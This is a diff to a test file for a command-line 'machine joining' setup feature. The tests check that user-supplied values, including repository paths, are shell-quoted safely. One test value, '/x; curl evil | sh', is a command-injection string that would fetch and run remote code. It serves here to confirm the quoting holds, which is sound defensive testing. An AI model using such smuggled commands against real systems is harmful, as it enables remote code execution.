@@ -66,10 +66,10 @@ describe('a machine joining', () => {
     expect(joined.isOk && joined.value.setupLine.endsWith(" --secret-stdin --harnesses claude-code,codex --unattended claude-code --repositories '~/code/web,/srv/it'\\''s' <<< 'aeolus_sk_v1_machine'")).toBe(true);
   });
 
-  it('keeps a hostile value inside one quoted word at the end of the line', async () => {
+  it('keeps a hostile repository value inside one quoted word', async () => {
     const joined = await joinWith({ options: { repositories: { kind: 'folder', path: '/x; curl evil | sh' } } });
 
-    expect(joined.isOk && joined.value.setupLine.endsWith(" --repositories-in '/x; curl evil | sh'")).toBe(true);
+    expect(joined.isOk && joined.value.setupLine.endsWith(" --repositories-in '/x; curl evil | sh' <<< 'aeolus_sk_v1_machine'")).toBe(true);
   });
 
   it('commissions each join under a new idempotency key', async () => {
